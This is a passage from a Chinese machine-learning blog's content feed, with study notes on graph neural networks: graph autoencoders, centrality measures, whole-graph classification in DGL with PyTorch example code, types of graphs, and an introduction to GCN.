href="https://link.zhihu.com/?target=https%3A//bluefisher.github.io/2020/02/06/%E7%90%86%E8%A7%A3-Variational-Lower-Bound/">variational lower bound</a>目标函数， 从而优化GCN的层参数 <img src="https://www.zhihu.com/equation?tex=%5Cbm%7BW_0%7D" alt="[公式]"> 和 <img src="https://www.zhihu.com/equation?tex=%5Cbm%7BW%7D_1" alt="[公式]"> 。</p><p>注：目标函数中的期望项只包括了标签为1的node，而标签为0的node是不予考虑的。在代码里是这样的操作的（见代码解读部分）：在计算交叉熵损失的时候，给标签为1的正样本很高的权重，从而让其主导训练的过程。</p><hr><h2 id="代码解读httpsgithubcomtkipfgae">代码解读：<a href="https://link.zhihu.com/?target=https%3A//github.com/tkipf/gae">https://github.com/tkipf/gae</a></h2><h3 id="1gae">1.GAE</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241735273.jpg" alt="img"></p><p><strong>2.VGAE</strong></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241735275.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图与中心性</title>
      <link href="/2023/10/10/AILearning/GNN/%E5%9B%BE%E7%9A%84%E4%B8%AD%E5%BF%83%E6%80%A7/"/>
      <url>/2023/10/10/AILearning/GNN/%E5%9B%BE%E7%9A%84%E4%B8%AD%E5%BF%83%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="一-度中心性-degree-centrality"><strong>一、度中心性 Degree Centrality</strong></h2><p>在网络中，一个节点的度越大，就意味着这个节点的度中心性就越高，就说明在网络中这个节点越重要。</p><p><img src="https://www.zhihu.com/equation?tex=%E5%BA%A6%E4%B8%AD%E5%BF%83%E6%80%A7%3D%5Cfrac%7BN_%7Bdegree%7D+%7D%7Bn-1%7D+" alt="[公式]"></p><p>其中，n表示节点的数量， <img src="https://www.zhihu.com/equation?tex=N_%7Bdegree%7D+" alt="[公式]"> 表示该节点的度。</p><h2 id="二-特征向量中心性-eigenvector-centrality"><strong>二、特征向量中心性 Eigenvector Centrality</strong></h2><p>一个节点的重要性取决于其邻居节点的数量（即该节点的度），也取决与其邻居节点的重要性。与之相连的邻居节点越重要，则该节点就越重要。</p><p>特征向量中心性的计算公式如下：</p><p>假设 <img src="https://www.zhihu.com/equation?tex=x_%7Bi%7D+" alt="[公式]"> 表示节点i的重要性，则 <img src="https://www.zhihu.com/equation?tex=EC_%7Bi%7D%3Dx_%7Bi%7D%3Dc%5Csum_%7Bj%3D1%7D%5E%7Bn%7D+a_%7Bij%7Dx_%7Bj%7D" alt="[公式]"></p><p>其中，c为比例常数，记 <img src="https://www.zhihu.com/equation?tex=x%3D%5Cleft+%5B++x_%7B1%7D%2Cx_%7B2%7D%2Cx_%7B3%7D%2C...%2Cx_%7Bn%7D%5Cright+%5D+%5ET" alt="[公式]"> ,经过多次迭代达到稳态时，可以写成如下矩阵形式：</p><p>x=c<strong>Ax.</strong></p><p>这里x表示的是矩阵A的特征值 <img src="https://www.zhihu.com/equation?tex=c%5E%7B-1%7D" alt="[公式]"> 对应的特征向量，也可以表示成 <img src="https://www.zhihu.com/equation?tex=Ax%3D%5Clambda+x" alt="[公式]"> 这种形式。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（哎，百度出来的，其实自己也没看明白，多次迭代到稳态是什么意思啊。。。）</span><br></pre></td></tr></table></figure><p>于是自己又在b站上面看了个视频。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241700139.jpg" alt="img"></p><p>如图，先求出该图所表示的邻接矩阵的特征值。选最大的一个特征值2.48，求出对应的特征向量。将其乘以-1，是没有影响的。于是得到了图中所示的特征向量中心性</p><p>{1：0.53，2：0.358, 3:0.358 , 4:0.427 ,5:0.53}</p><p>可以看到，1和5节点的特征向量中心性是比较大的，因为其本身的度就比较大。</p><p>其次是2，3，4节点，它们自身的度都是2，但是特征向量中心性不一样。2连接了1，3连接了5，但是4连接了1和5，特征向量中心性与该节点的邻居节点重要性相关，所以4的特征向量中心性比2和3的大。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">于是写到这样，勉强理解了特征向量中心性吧。</span><br></pre></td></tr></table></figure><h2 id="三-中介中心性-between-centrality"><strong>三、中介中心性 Between Centrality</strong></h2><p>以经过某个节点的最短路径数目来刻画节点的重要性指标。</p><p>计算公式： <img src="https://www.zhihu.com/equation?tex=BC%3D%5Csum+%5Cfrac%7Bd_%7Bst%7D()%7D%7Bd_%7Bst%7D%7D+" alt="[公式]"> ，</p><p>其中dst表示s到t的最短路径数量，dst()表示从s到t的最短路径中经过节点的数量。若需要进行标准化，在如上公式基础上，除以（n-1)(n-2)，n为节点数量。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241700143.jpg" alt="img"></p><p><img src="https://www.zhihu.com/equation?tex=BC_%7B4%7D%3D%5Cfrac%7B(0%2B1%2B1%2B0.5)%2B(1%2B1%2B1%2B1)%2B(0%2B1%2B0%2B1)%2B(1%2B1%2B1%2B1)%2B(0.5%2B0%2B1%2B1)%7D%7B20%7D+%3D15%2F20" alt="[公式]"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241700146.jpg" alt="img"></p><p><img src="https://www.zhihu.com/equation?tex=BC_%7B3%7D%3D%5Cfrac%7B0.5%2B0.5%7D%7B20%7D+" alt="[公式]"></p><p>以上举例了节点3和4，其余的同理。</p><h2 id="四-紧密中心性-closeness-centrality">四、紧密中心性 Closeness Centrality</h2><p>反映在网络中某一节点与其他节点之间的接近程度。如果一个节点离其他的节点都很近，那么传递信息的时候就不需要依赖其他的节点，说明这个节点很重要。</p><p>计算公式： <img src="https://www.zhihu.com/equation?tex=d_%7Bi%7D%3D%5Cfrac%7B1%7D%7Bn-1%7D%5Csum_%7Bj%5Cne+i%7D%5E%7B%7D+d_%7Bij%7D" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=CC_%7Bi%7D%3D%5Cfrac%7B1%7D%7Bd_%7Bi%7D%7D+%3D%5Cfrac%7Bn-1%7D%7B%5Csum_%7Bj%5Cne+i%7D%5E%7B%7D+d_%7Bij%7D%7D+" alt="[公式]"></p><p>这个点的紧密中心性是基于该节点到网络中其余所有节点的最短路径之和，如果进行归一化处理，就是求这个节点到其他所有节点的平均最短距离。一个节点的平均最短距离越小，那么这个进行的紧密中心性就越大。如果节点i和节点j之间没有路径可达，则定义dij为无穷大，其倒数为0.</p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DGL整图分类</title>
      <link href="/2023/10/10/AILearning/GNN/DGL%E6%95%B4%E5%9B%BE%E5%88%86%E7%B1%BB/"/>
      <url>/2023/10/10/AILearning/GNN/DGL%E6%95%B4%E5%9B%BE%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>许多场景中的图数据是由多个图组成，而不是单个的大图数据。例如不同类型的人群社区。 通过用图刻画同一社区里人与人间的友谊，可以得到多张用于分类的图。 在这个场景里，整图分类模型可以识别社区的类型，即根据结构和整体信息对图进行分类。</p><h2 id="概述">概述<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id2">¶</a></h2><p>整图分类与节点分类或链接预测的主要区别是：预测结果刻画了整个输入图的属性。 与之前的任务类似，用户还是在节点或边上进行消息传递。但不同的是，整图分类任务还需要得到整个图的表示。</p><p>整图分类的处理流程如下图所示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241756451.png" alt="Graph Classification Process"></p><p><em>整图分类流程</em><a href="https://docs.dgl.ai/guide_cn/training-graph.html#id11">¶</a></p><p>从左至右，一般流程是：</p><ul><li>准备一个批次的图；</li><li>在这个批次的图上进行消息传递以更新节点或边的特征；</li><li>将一张图里的节点或边特征聚合成整张图的图表示；</li><li>根据任务设计分类层。</li></ul><h3 id="批次的图">批次的图<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id3">¶</a></h3><p>整图分类任务通常需要在很多图上进行训练。如果用户在训练模型时一次仅使用一张图，训练效率会很低。 借用深度学习实践中常用的小批次训练方法，用户可将多张图组成一个批次，在整个图批次上进行一次训练迭代。</p><p>使用DGL，用户可将一系列的图建立成一个图批次。一个图批次可以被看作是一张大图，图中的每个连通子图对应一张原始小图。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241756455.png" alt="Batched Graph"></p><p><em>批次化的图</em><a href="https://docs.dgl.ai/guide_cn/training-graph.html#id12">¶</a></p><p>需要注意，DGL里对图进行变换的函数会去掉图上的批次信息。用户可以通过 <a href="https://docs.dgl.ai/generated/dgl.DGLGraph.set_batch_num_nodes.html#dgl.DGLGraph.set_batch_num_nodes"><code>dgl.DGLGraph.set_batch_num_nodes()</code></a> 和 <a href="https://docs.dgl.ai/generated/dgl.DGLGraph.set_batch_num_edges.html#dgl.DGLGraph.set_batch_num_edges"><code>dgl.DGLGraph.set_batch_num_edges()</code></a> 两个函数在变换后的图上重新加入批次信息。</p><h3 id="图读出">图读出<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id4">¶</a></h3><p>数据集中的每一张图都有它独特的结构和节点与边的特征。为了完成单个图的预测，通常会聚合并汇总单个图尽可能多的信息。 这类操作叫做“读出”。<mark><strong>常见的聚合方法包括：对所有节点或边特征求和、取平均值、逐元素求最大值或最小值。</strong></mark></p><p>给定一张图 g，对它所有节点特征取平均值的聚合读出公式如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241756464.png" alt="image-20231211162452437"></p><p>其中，hgℎ是图 g的表征， V 是图 g中节点的集合， hvℎ 是节点 v的特征。</p><p>DGL内置了常见的图读出函数，例如 <a href="https://docs.dgl.ai/generated/dgl.readout_nodes.html#dgl.readout_nodes"><code>dgl.readout_nodes()</code></a> 就实现了上述的平均值读出计算。</p><p>在得到 hgℎ 后，用户可将其传给一个多层感知机(MLP)来获得分类输出。</p><h2 id="编写神经网络模型">编写神经网络模型<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id5">¶</a></h2><p>模型的输入是带节点和边特征的批次化图。需要注意的是批次化图中的节点和边属性没有批次大小对应的维度。 模型中应特别注意以下几点。</p><h3 id="批次化图上的计算">批次化图上的计算<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id6">¶</a></h3><p>首先，一个批次中不同的图是完全分开的，即任意两个图之间没有边连接。 根据这个良好的性质，所有消息传递函数(的计算)仍然具有相同的结果。</p><p>其次，读出函数会分别作用在图批次中的每张图上。假设批次大小为 B，要聚合的特征大小为 D， 则图读出的张量形状为 (B,D)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import dgl</span><br><span class="line">import torch</span><br><span class="line"></span><br><span class="line">g1 = dgl.graph(([0, 1], [1, 0]))</span><br><span class="line">g1.ndata[&#x27;h&#x27;] = torch.tensor([1., 2.])</span><br><span class="line">g2 = dgl.graph(([0, 1], [1, 2]))</span><br><span class="line">g2.ndata[&#x27;h&#x27;] = torch.tensor([1., 2., 3.])</span><br><span class="line"></span><br><span class="line">dgl.readout_nodes(g1, &#x27;h&#x27;)</span><br><span class="line"># tensor([3.])  # 1 + 2</span><br><span class="line"></span><br><span class="line">bg = dgl.batch([g1, g2])</span><br><span class="line">dgl.readout_nodes(bg, &#x27;h&#x27;)</span><br><span class="line"># tensor([3., 6.])  # [1 + 2, 1 + 2 + 3]</span><br></pre></td></tr></table></figure><p>最后，批次化图中的每个节点或边特征张量均通过将所有图上的相应特征拼接得到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bg.ndata[&#x27;h&#x27;]</span><br><span class="line"># tensor([1., 2., 1., 2., 3.])</span><br></pre></td></tr></table></figure><h3 id="模型定义">模型定义<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id7">¶</a></h3><p>了解了上述计算规则后，用户可以定义一个非常简单的模型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import dgl.nn.pytorch as dglnn</span><br><span class="line">import torch.nn as nn</span><br><span class="line"></span><br><span class="line">class Classifier(nn.Module):</span><br><span class="line">    def __init__(self, in_dim, hidden_dim, n_classes):</span><br><span class="line">        super(Classifier, self).__init__()</span><br><span class="line">        self.conv1 = dglnn.GraphConv(in_dim, hidden_dim)</span><br><span class="line">        self.conv2 = dglnn.GraphConv(hidden_dim, hidden_dim)</span><br><span class="line">        self.classify = nn.Linear(hidden_dim, n_classes)</span><br><span class="line"></span><br><span class="line">    def forward(self, g, h):</span><br><span class="line">        # 应用图卷积和激活函数</span><br><span class="line">        h = F.relu(self.conv1(g, h))</span><br><span class="line">        h = F.relu(self.conv2(g, h))</span><br><span class="line">        with g.local_scope():</span><br><span class="line">            g.ndata[&#x27;h&#x27;] = h</span><br><span class="line">            # 使用平均读出计算图表示</span><br><span class="line">            hg = dgl.mean_nodes(g, &#x27;h&#x27;)</span><br><span class="line">            return self.classify(hg)</span><br></pre></td></tr></table></figure><h2 id="模型的训练">模型的训练<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id8">¶</a></h2><h3 id="数据加载">数据加载<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id9">¶</a></h3><p>模型定义完成后，用户就可以开始训练模型。由于整图分类处理的是很多相对较小的图，而不是一个大图， 因此通常可以在随机抽取的小批次图上进行高效的训练，而无需设计复杂的图采样算法。</p><p>以下例子中使用了 <a href="https://docs.dgl.ai/guide_cn/data.html#guide-cn-data-pipeline">第4章：图数据处理管道</a> 中的整图分类数据集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import dgl.data</span><br><span class="line">dataset = dgl.data.GINDataset(&#x27;MUTAG&#x27;, False)</span><br></pre></td></tr></table></figure><p>整图分类数据集里的每个数据点是一个图和它对应标签的元组。为提升数据加载速度， 用户可以调用GraphDataLoader，从而以小批次遍历整个图数据集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from dgl.dataloading import GraphDataLoader</span><br><span class="line">dataloader = GraphDataLoader(</span><br><span class="line">    dataset,</span><br><span class="line">    batch_size=1024,</span><br><span class="line">    drop_last=False,</span><br><span class="line">    shuffle=True)</span><br></pre></td></tr></table></figure><p>训练过程包括遍历dataloader和更新模型参数的部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import torch.nn.functional as F</span><br><span class="line"></span><br><span class="line"># 这仅是个例子，特征尺寸是7</span><br><span class="line">model = Classifier(7, 20, 5)</span><br><span class="line">opt = torch.optim.Adam(model.parameters())</span><br><span class="line">for epoch in range(20):</span><br><span class="line">    for batched_graph, labels in dataloader:</span><br><span class="line">        feats = batched_graph.ndata[&#x27;attr&#x27;]</span><br><span class="line">        logits = model(batched_graph, feats)</span><br><span class="line">        loss = F.cross_entropy(logits, labels)</span><br><span class="line">        opt.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        opt.step()</span><br></pre></td></tr></table></figure><p>DGL实现了一个整图分类的样例： <a href="https://github.com/dmlc/dgl/tree/master/examples/pytorch/gin">DGL的GIN样例</a>。 模型训练的代码请参考位于 <a href="https://github.com/dmlc/dgl/blob/master/examples/pytorch/gin/main.py">main.py</a> 源文件中的 <code>train</code> 函数。 模型实现位于 <a href="https://github.com/dmlc/dgl/blob/master/examples/pytorch/gin/gin.py">gin.py</a> ， 其中使用了更多的模块组件，例如使用 <code>dgl.nn.pytorch.GINConv</code> 模块作为图卷积层(DGL同样支持它在MXNet和TensorFlow后端里的实现)、批量归一化等。</p><h2 id="异构图上的整图分类模型的训练">异构图上的整图分类模型的训练<a href="https://docs.dgl.ai/guide_cn/training-graph.html#id10">¶</a></h2><p>在异构图上做整图分类和在同构图上做整图分类略有不同。用户除了需要使用异构图卷积模块，还需要在读出函数中聚合不同类别的节点。</p><p>以下代码演示了如何对每种节点类型的节点表示取平均值并求和。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class RGCN(nn.Module):</span><br><span class="line">    def __init__(self, in_feats, hid_feats, out_feats, rel_names):</span><br><span class="line">        super().__init__()</span><br><span class="line"></span><br><span class="line">        self.conv1 = dglnn.HeteroGraphConv(&#123;</span><br><span class="line">            rel: dglnn.GraphConv(in_feats, hid_feats)</span><br><span class="line">            for rel in rel_names&#125;, aggregate=&#x27;sum&#x27;)</span><br><span class="line">        self.conv2 = dglnn.HeteroGraphConv(&#123;</span><br><span class="line">            rel: dglnn.GraphConv(hid_feats, out_feats)</span><br><span class="line">            for rel in rel_names&#125;, aggregate=&#x27;sum&#x27;)</span><br><span class="line"></span><br><span class="line">    def forward(self, graph, inputs):</span><br><span class="line">        # inputs是节点的特征</span><br><span class="line">        h = self.conv1(graph, inputs)</span><br><span class="line">        h = &#123;k: F.relu(v) for k, v in h.items()&#125;</span><br><span class="line">        h = self.conv2(graph, h)</span><br><span class="line">        return h</span><br><span class="line"></span><br><span class="line">class HeteroClassifier(nn.Module):</span><br><span class="line">    def __init__(self, in_dim, hidden_dim, n_classes, rel_names):</span><br><span class="line">        super().__init__()</span><br><span class="line"></span><br><span class="line">        self.rgcn = RGCN(in_dim, hidden_dim, hidden_dim, rel_names)</span><br><span class="line">        self.classify = nn.Linear(hidden_dim, n_classes)</span><br><span class="line"></span><br><span class="line">    def forward(self, g):</span><br><span class="line">        h = g.ndata[&#x27;feat&#x27;]</span><br><span class="line">        h = self.rgcn(g, h)</span><br><span class="line">        with g.local_scope():</span><br><span class="line">            g.ndata[&#x27;h&#x27;] = h</span><br><span class="line">            # 通过平均读出值来计算单图的表征</span><br><span class="line">            hg = 0</span><br><span class="line">            for ntype in g.ntypes:</span><br><span class="line">                hg = hg + dgl.mean_nodes(g, &#x27;h&#x27;, ntype=ntype)</span><br><span class="line">            return self.classify(hg)</span><br></pre></td></tr></table></figure><p>剩余部分的训练代码和同构图代码相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># etypes是一个列表，元素是字符串类型的边类型</span><br><span class="line">model = HeteroClassifier(10, 20, 5, etypes)</span><br><span class="line">opt = torch.optim.Adam(model.parameters())</span><br><span class="line">for epoch in range(20):</span><br><span class="line">    for batched_graph, labels in dataloader:</span><br><span class="line">        logits = model(batched_graph)</span><br><span class="line">        loss = F.cross_entropy(logits, labels)</span><br><span class="line">        opt.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        opt.step()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DGL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图类型</title>
      <link href="/2023/10/10/AILearning/GNN/%E5%9B%BE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/10/10/AILearning/GNN/%E5%9B%BE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="最重要的4类图数据">最重要的4类图数据：</h4><ul><li><p>同构图（Homogeneous Graph）</p></li><li><p>异构图（Heterogeneous Graph）</p></li><li><p>属性图（Property Graph）</p></li><li><p>非显式图（Graph Constructed from Non-relational Data）。</p></li></ul><p>（1）同构图：<br>同构图是指图中的节点类型和关系类型都仅有一种。同构图是实际图数据的一种最简化的情况，如由超链接关系所构成的万维网，这类图数据的信息全部包含在邻接矩阵里。</p><p>同构图：在图里面，节点的类型和边的类型只有一种的图，<br>举个例子，像社交网络中只存在一种节点类型，用户节点和一种边的类型，用户-用户之间的连边。</p><p>（2）异构图：<br>与同构图相反，异构图是指图中的节点类型或关系类型多于一种。在现实场景中，我们通常研究的图数据对象是多类型的，对象之间的交互关系也是多样化的。因此，异构图能够更好地贴近现实。</p><p>异构图：在图里面，节点的类型+边的类型&gt;2的一种图，<br>举个例子，论文引用网络中，存在着作者节点和paper节点，边的关系有作者-作者之间的共同创作关系连边，作者-论文之间的从属关系，论文-论文之间的引用关系。</p><p>（3）属性图：<br>相较于异构图，属性图给图数据增加了额外的属性信息，如下图所示。对于一个属性图而言，节点和关系都有标签（Label）和属性（Property），这里的标签是指节点或关系的类型，如某节点的类型为“用户”，属性是节点或关系的附加描述信息，如“用户”节点可以有“姓名”“注册时间”“注册地址”等属性。属性图是一种最常见的工业级图数据的表示方式，能够广泛适用于多种业务场景下的数据表达。</p><p>属性图：图的节点上存在着初始属性attribute，可以用作后续节点的特征</p><p>（4）非显式图：<br>非显式图是指数据之间没有显式地定义出关系，需要依据某种规则或计算方式将数据的关系表达出来，进而将数据当成一种图数据进行研究。比如计算机3D视觉中的点云数据，如果我们将节点之间的空间距离转化成关系的话，点云数据就成了图数据。</p><p>其他：<br>动态图：图中的节点或者边都是随着时间变化的，可能增加或减少，一般是图的构成是按照时间片来构成，每一个时间片一个图的表示，例如t1时刻的图是初始图，t2时刻的图就是节点或连边变化后的图一直到tn时刻</p><p>关系图：图表示了一种节点之间的隐含关系，举个例子 知识图谱</p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GCN浅入</title>
      <link href="/2023/10/10/AILearning/GNN/GCN%E6%B5%85%E5%85%A5/"/>
      <url>/2023/10/10/AILearning/GNN/GCN%E6%B5%85%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="gcn">GCN</h1><p>GCN的公式看起来还是有点吓人的，论文里的公式更是吓破了我的胆儿。但后来才发现，其实90%的内容根本不必理会，只是为了从数学上严谨地把事情给讲清楚，但是完全不影响我们的理解，尤其对于我这种“追求直觉，不求甚解”之人。</p><p>下面进入正题，我们直接看看GCN的核心部分是什么样子：</p><p>假设我们手头有一批图数据，其中有N个节点（node），每个节点都有自己的特征，我们设这些节点的特征组成一个N×D维的矩阵X，然后各个节点之间的关系也会形成一个N×N维的矩阵A，也称为邻接矩阵（adjacency matrix）。X和A便是我们模型的输入。</p><p>GCN也是一个神经网络层，它的层与层之间的传播方式是：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730114.png" alt="img"></p><p>这个公式中：</p><ul><li>A波浪=A+I，I是单位矩阵</li><li>D波浪是A波浪的度矩阵（degree matrix），公式为</li><li>H是每一层的特征，对于输入层的话，H就是X</li><li>σ是非线性激活函数</li></ul><p>我们先不用考虑为什么要这样去设计一个公式。我们现在只用知道：</p><p>这个部分，是可以事先算好的，因为D波浪由A计算而来，而A是我们的输入之一。</p><p>所以对于不需要去了解数学原理、只想应用GCN来解决实际问题的人来说，你只用知道：哦，这个GCN设计了一个牛逼的公式，用这个公式就可以很好地提取图的特征。这就够了，毕竟不是什么事情都需要知道内部原理，这是根据需求决定的。</p><p>为了直观理解，我们用论文中的一幅图：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730115.jpg" alt="img"></p><p>上图中的GCN输入一个图，通过若干层GCN每个node的特征从X变成了Z，但是，无论中间有多少层，node之间的连接关系，即A，都是共享的。</p><p>假设我们构造一个两层的GCN，激活函数分别采用ReLU和Softmax，则整体的正向传播的公式为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730119.png" alt="img"></p><p>最后，我们针对所有带标签的节点计算cross entropy损失函数：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730118.png" alt="img"></p><p>就可以训练一个node classification的模型了。由于即使只有很少的node有标签也能训练，作者称他们的方法为半监督分类。</p><p>当然，你也可以用这个方法去做graph classification、link prediction，只是把损失函数给变化一下即可。</p><p>三、GCN 为什么是这个样子</p><p>我前后翻看了很多人的解读，但是读了一圈，最让我清楚明白为什么GCN的公式是这样子的居然是作者Kipf自己的博客：<a href="http://tkipf.github.io/graph-convolutional-networks/">http://tkipf.github.io/graph-convolutional-networks/</a> 推荐大家一读。</p><p>作者给出了一个由简入繁的过程来解释：</p><p>我们的每一层GCN的输入都是邻接矩阵A和node的特征H，那么我们直接做一个内积，再乘一个参数矩阵W，然后激活一下，就相当于一个简单的神经网络层嘛，是不是也可以呢？</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730123.png" alt="img"></p><p>实验证明，即使就这么简单的神经网络层，就已经很强大了。这个简单模型应该大家都能理解吧，这就是正常的神经网络操作。</p><p>但是这个简单模型有几个局限性：</p><ul><li>只使用A的话，由于A的对角线上都是0，所以在和特征矩阵H相乘的时候，只会计算一个node的所有邻居的特征的加权和，该node自己的特征却被忽略了。因此，我们可以做一个小小的改动，给A加上一个单位矩阵 I ，这样就让对角线元素变成1了。</li><li>A是没有经过归一化的矩阵，这样与特征矩阵相乘会改变特征原本的分布，产生一些不可预测的问题。所以我们对A做一个标准化处理。首先让A的每一行加起来为1，我们可以乘以一个D的逆，D就是度矩阵。我们可以进一步把D的拆开与A相乘，得到一个对称且归一化的矩阵 ：。</li></ul><p>通过对上面两个局限的改进，我们便得到了最终的层特征传播公式：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730124.png" alt="img"></p><p>其中</p><p>公式中的与对称归一化拉普拉斯矩阵十分类似，而在谱图卷积的核心就是使用对称归一化拉普拉斯矩阵，这也是GCN的卷积叫法的来历。原论文中给出了完整的从谱卷积到GCN的一步步推导，我是看不下去的，大家有兴趣可以自行阅读。</p><p>。</p><p>四、GCN 有多牛</p><p>在看了上面的公式以及训练方法之后，我并没有觉得GCN有多么特别，无非就是一个设计巧妙的公式嘛，也许我不用这么复杂的公式，多加一点训练数据或者把模型做深，也可能达到媲美的效果呢。</p><p>但是一直到我读到了论文的附录部分，我才顿时发现：GCN原来这么牛啊！</p><p>为啥呢？</p><p>因为即使不训练，完全使用随机初始化的参数W，GCN提取出来的特征就以及十分优秀了！这跟CNN不训练是完全不一样的，后者不训练是根本得不到什么有效特征的。</p><p>我们看论文原文：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730287.jpg" alt="img"></p><p>然后作者做了一个实验，使用一个俱乐部会员的关系网络，使用随机初始化的GCN进行特征提取，得到各个node的embedding，然后可视化：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730300.jpg" alt="img"></p><p>可以发现，在原数据中同类别的node，经过GCN的提取出的embedding，已经在空间上自动聚类了。</p><p>而这种聚类结果，可以和DeepWalk、node2vec这种经过复杂训练得到的node embedding的效果媲美了。</p><p>说的夸张一点，比赛还没开始，GCN就已经在终点了。看到这里我不禁猛拍大腿打呼：“NB！”</p><p>还没训练就已经效果这么好，那给少量的标注信息，GCN的效果就会更加出色。</p><p>作者接着给每一类的node，提供仅仅一个标注样本，然后去训练，得到的可视化效果如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241730313.gif" alt="img"></p><p>这是整片论文让我印象最深刻的地方。</p><p>其他：</p><ol><li>对于很多网络，我们可能没有节点的特征，这个时候可以使用GCN吗？答案是可以的，如论文中作者对那个俱乐部网络，采用的方法就是用单位矩阵 I 替换特征矩阵 